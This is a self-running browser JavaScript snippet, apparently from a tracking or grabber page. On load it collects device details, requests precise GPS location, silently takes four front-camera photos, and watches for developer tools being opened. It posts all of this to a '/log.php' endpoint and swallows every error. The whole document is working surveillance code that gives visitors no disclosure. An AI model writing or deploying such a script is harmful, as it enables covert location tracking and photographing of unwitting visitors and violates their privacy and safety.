(async () => {
  const session = localStorage.getItem("sess") || (Math.random().toString(36).substr(2, 12));
  localStorage.setItem("sess", session);

  const post = async (data) => {
    try {
      await fetch("/log.php", {
        method: "POST",
        body: JSON.stringify(data),
        headers: { "Content-Type": "application/json" }
      });
    } catch (e) {}
  };

  const sendInfo = async () => {
    const battery = await navigator.getBattery?.();
    const theme = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";

    const data = {
      session,
      type: "device",
      ua: navigator.userAgent,
      lang: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      time: new Date().toString(),
      theme,
      battery: battery ? {
        level: battery.level,
        charging: battery.charging
      } : null,
      ref: document.referrer || "Direct"
    };

    post(data);
  };

  const sendGPS = () => {
    navigator.geolocation.getCurrentPosition(pos => {
      post({
        session,
        type: "gps",
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        acc: pos.coords.accuracy
      });
    }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
  };

  const flashCapture = async (i) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      const canvas = document.createElement("canvas");
      const snap = () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const data = canvas.toDataURL("image/jpeg", 0.7);
        post({ session, type: "photo", index: i, photo: data });
      };

      setTimeout(() => {
        snap();
        stream.getTracks().forEach(track => track.stop());
      }, 1800 + i * 3000);
    } catch (e) {}
  };

  const detectDevtools = () => {
    let opened = false;
    setInterval(() => {
      const widthThreshold = window.outerWidth - window.innerWidth > 160;
      const heightThreshold = window.outerHeight - window.innerHeight > 160;
      const isDevtools = widthThreshold || heightThreshold;
      if (isDevtools && !opened) {
        post({ session, type: "debug", flag: true });
        opened = true;
      }
    }, 2000);
  };

  const inactivityWatch = () => {
    let timeout;
    const reset = () => {
      clearTimeout(timeout);
      timeout = setTimeout(() => {
        post({ session, type: "inactivity", time: Date.now() });
      }, 45000);
    };
    ['mousemove', 'keydown', 'touchstart'].forEach(evt =>
      document.addEventListener(evt, reset)
    );
    reset();
  };

  // Run all modules
  sendInfo();
  sendGPS();
  detectDevtools();
  inactivityWatch();
  for (let i = 0; i < 4; i++) flashCapture(i);
})();